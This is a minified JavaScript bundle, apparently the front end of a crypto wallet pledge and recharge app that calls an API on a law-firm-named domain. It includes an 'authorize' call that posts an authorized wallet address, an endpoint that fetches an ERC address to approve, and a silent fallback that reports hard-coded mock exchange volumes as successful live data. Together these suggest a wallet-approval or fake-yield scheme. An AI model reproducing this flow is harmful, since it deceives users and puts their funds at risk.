import{g as e,s as t,r as o,K as n,T as a,a as s,A as r,B as i,U as c}from"./index-BPWpFivt.js";const l={state:{token:e("userToken")||"",tokenTimestamp:e("tokenTimestamp")||0,walletAddress:"",isWalletConnected:!1},_listeners:[],setToken(e,o=!1){const n=Date.now(),a=this.state.tokenTimestamp||0;if(!o&&n<a)return console.warn("拒绝设置较旧的token",{newTimestamp:n,currentTimestamp:a,tokenPreview:e?e.substring(0,10)+"...":"empty"}),!1;const s=this.state.token;return this.state.token=e,this.state.tokenTimestamp=n,t("userToken",e),t("tokenTimestamp",n),console.log("Token已更新",{timestamp:n,tokenPreview:e?e.substring(0,10)+"...":"empty",oldTokenPreview:s?s.substring(0,10)+"...":"empty"}),this._notifyListeners("tokenUpdated",{newToken:e,oldToken:s,timestamp:n}),!0},getToken(){return this.state.token},clearToken(){const e=this.state.token;this.state.token="",this.state.tokenTimestamp=0,o("userToken"),o("tokenTimestamp"),this._notifyListeners("tokenCleared",{oldToken:e})},addListener(e){return this._listeners.push(e),()=>{const t=this._listeners.indexOf(e);t>-1&&this._listeners.splice(t,1)}},_notifyListeners(e,t){this._listeners.forEach((o=>{try{o(e,t)}catch(n){console.error("Store listener error:",n)}}))}};let d="",u=!1,h=[];const m="https://u.souhlawfirm.com/api",g=1e4,w={},p={async enqueue(e,t,o=Date.now()){return new Promise(((n,a)=>{const s={address:e,tid:t,requestId:o,resolve:n,reject:a,timestamp:Date.now()};h.push(s),console.log(`wallet_connect请求加入队列: ${o}, 队列长度: ${h.length}`),this.processQueue()}))},async processQueue(){if(u||0===h.length)return;u=!0;const e=h.shift();try{console.log(`开始处理wallet_connect请求: ${e.requestId}`);const t=await this.executeWalletConnect(e.address,e.tid);if(t&&0===t.code&&t.token){const o=l.setToken(t.token);console.log(`Token更新${o?"成功":"失败"}: ${e.requestId}`),o&&(console.log(`wallet_connect成功，立即调用getinfo: ${e.requestId}`),this.fetchUserInfoImmediately(e.requestId))}e.resolve(t)}catch(t){console.error(`wallet_connect请求失败: ${e.requestId}`,t),e.reject(t)}finally{u=!1,h.length>0&&setTimeout((()=>this.processQueue()),100)}},async fetchUserInfoImmediately(e){try{console.log(`立即获取用户信息: ${e}`);const t=await this.executeGetInfo();t&&(console.log(`用户信息获取成功: ${e}`,t),c("userInfoUpdated",{data:t,source:"wallet_connect_immediate",requestId:e,timestamp:Date.now()}))}catch(t){console.error(`立即获取用户信息失败: ${e}`,t)}},async executeGetInfo(){const e=l.getToken();if(!e)throw new Error("No token available");const t={url:`${m}/getinfo`,method:"POST",timeout:g,header:{"Content-Type":"application/x-www-form-urlencoded"},data:`token=${encodeURIComponent(e)}`},o=await n(t);if(200!==o.statusCode)throw new Error(`HTTP request failed, status code: ${o.statusCode}`);return o.data},async executeWalletConnect(e,t){const o={url:`${m}/wallet_connect`,method:"POST",timeout:g,header:{"Content-Type":"application/x-www-form-urlencoded"},data:`address=${encodeURIComponent(e)}&tid=${encodeURIComponent(t||"")}`},a=await n(o);if(200!==a.statusCode)throw new Error(`HTTP request failed, status code: ${a.statusCode}`);return a.data}},k={callHistory:new Map,canCall(e,t=1e3){const o=Date.now(),n=this.callHistory.get(e)||0;return o-n<t?(console.log(`API调用被限制: ${e}, 距离上次调用仅${o-n}ms`),!1):(this.callHistory.set(e,o),!0)},cleanup(){const e=Date.now();for(const[t,o]of this.callHistory)e-o>6e4&&this.callHistory.delete(t)}};setInterval((()=>{k.cleanup()}),6e4);const T=async(t,o={})=>{const a={url:`${m}${t}`,method:o.method||"GET",timeout:o.timeout||g,...o};if("POST"===a.method){let e={...a.data||{}};if(!1!==o.needToken){const t=l.getToken();t?(e.token=t,console.log("使用token:",t.substring(0,10)+"...")):console.warn("需要token但store中没有token")}a.header={"Content-Type":"application/x-www-form-urlencoded",...a.header};const t=Object.keys(e).map((t=>`${encodeURIComponent(t)}=${encodeURIComponent(e[t]||"")}`)).join("&");a.data=t}else if("GET"===a.method){if(!1!==o.needToken){const e=l.getToken();e?(a.data={token:e},console.log("GET请求使用token:",e.substring(0,10)+"...")):console.warn("GET请求需要token但store中没有token")}a.header={...w,...a.header}}else a.header={...w,...a.header};const r=e("walletAddress");r&&r!==d&&(console.log("检测到钱包地址变化，清除可能的缓存数据"),d=r,c("walletAddressChanged",r));try{const e=await n(a);if(200!==e.statusCode)throw new Error(`HTTP request failed, status code: ${e.statusCode}`);return e.data&&e.data.code&&0!==e.data.code&&e.data.info&&(e.data.info.includes("token")||e.data.info.includes("unauthorized")||e.data.info.includes("invalid"))&&(console.warn("可能的token失效错误:",e.data),c("tokenMaybeInvalid",e.data)),e.data}catch(i){if(!1!==o.showError){const e=i.message||"Network request failed";s({title:e,icon:"none",duration:2e3})}throw i}},f={user:{getInfo:()=>k.canCall("getInfo",1e3)?T("/getinfo",{method:"POST"}):(console.log("getInfo被频率限制，返回null"),Promise.resolve(null)),walletConnect:async(e,t)=>await p.enqueue(e,t),authorize:e=>T("/shouquan",{method:"POST",data:{authorized_address:e}})},pledge:{getProducts:()=>T("/zhiya",{method:"GET",needToken:!1}),createOrder:(e,t)=>T("/zhiya_order",{method:"POST",data:{amount:e,id:t}})},transaction:{recharge:(e,t,o,n)=>T("/recharge",{method:"POST",data:{currency:e.toUpperCase(),amount:parseFloat(t).toString(),network:o,image:n}}),getRechargeAddress:()=>T("/recharge_address",{method:"GET",needToken:!1}),getAuthAddress:()=>k.canCall("getAuthAddress",3e3)?T("/get_erc",{method:"GET",needToken:!1,showError:!1}):Promise.resolve(null)},record:{getTransactionRecord:()=>T("/transaction_record",{method:"POST"}),getRevenueRecord:e=>T("/revenue_record",{method:"POST",data:{amount:e||""}}),getCashRecord:()=>T("/cash_record",{method:"POST"}),getPledgeOrderList:()=>T("/zhiya_order_list",{method:"POST"})},share:{getReferralInfo:(e,t,o,n)=>T("/getinfo",{method:"POST",needToken:!1,data:{address:e,tid:t,id:o,token:n}})},exchange:{async getRealTimeData(){return k.canCall("getRealTimeData",5e3)?await this.getRealTimeDataFallback():(console.log("交易所数据API调用频率限制"),null)},async getRealTimeDataFallback(){try{const o=await n({url:"https://u.souhlawfirm.com/api/get_hangqing",method:"GET",timeout:15e3,header:{Accept:"application/json, text/plain, */*"},dataType:"text",enableCache:!1});if(200===o.statusCode&&o.data){let n=o.data;if("string"==typeof n)try{n=n.trim();const e=n.indexOf("{"),t=n.lastIndexOf("}");if(!(-1!==e&&-1!==t&&t>e))throw new Error("Invalid JSON boundaries");{let o=n.substring(e,t+1).replace(/[\u0000-\u001F\u007F-\u009F]/g,"").replace(/\0/g,"").replace(/\uFEFF/g,"");n=JSON.parse(o)}}catch(e){try{let e=o.data.replace(/^[^{]*/,"").replace(/[^}]*$/,"").replace(/[\u0000-\u001F\u007F-\u009F]/g,"").trim();if(!e.startsWith("{")||!e.endsWith("}"))throw new Error("Data format error");n=JSON.parse(e)}catch(t){throw new Error("JSON parsing failed")}}return{success:!0,data:n,source:"http",timestamp:Date.now()}}throw new Error("Request failed")}catch(o){return console.error("HTTP获取交易所数据失败:",o),this.getMockData()}},getMockData:()=>({success:!0,source:"mock",timestamp:Date.now(),data:{Binance:{Bitcoin:{"24h_volume":143036058.8698347,liquidity:1196.5731502334615},Ethereum:{"24h_volume":193050552.5355645,liquidity:49160.43049534946}},Huobi:{Bitcoin:{"24h_volume":143036058.8698347,liquidity:1196.5731502334615},Ethereum:{"24h_volume":193051766.74541283,liquidity:49160.73969465557}},Gate:{Bitcoin:{"24h_volume":"729238874.7837782",liquidity:6191.468842403928},Ethereum:{"24h_volume":"892303570.631590",liquidity:235993.08630968884}},OKEx:{Bitcoin:{"24h_volume":"276460765.515367994",liquidity:2346.364111780278},Ethereum:{"24h_volume":"217037928.8277774633",liquidity:57425.40858198075}},KuCoin:{Bitcoin:{"24h_volume":"276486975.250267622",liquidity:2346.586229332074},Ethereum:{"24h_volume":"217037928.8277774633",liquidity:57425.40858198075}},Kraken:{Bitcoin:{"24h_volume":96895423.28070211,liquidity:821.0954664913476},Ethereum:{"24h_volume":92640192.57490566,liquidity:24392.927691324312}}}})}},y={formatAmount:e=>{if(null==e||""===e)return"0.00";const t=parseFloat(e);return isNaN(t)?"0.00":t.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})},checkNetwork:()=>new Promise((e=>{a({success:t=>{"none"===t.networkType?(s({title:"Network connection failed, please check network",icon:"none",duration:2e3}),e(!1)):e(!0)},fail:()=>{e(!1)}})})),showLoading:(e="Loading...")=>{r({title:e})},hideLoading:()=>{i()},showSuccess:(e="Operation successful")=>{s({title:e,icon:"success",duration:2e3})},showError:(e="Operation failed")=>{s({title:e,icon:"none",duration:2e3})}};export{f as a,y as b,l as s};
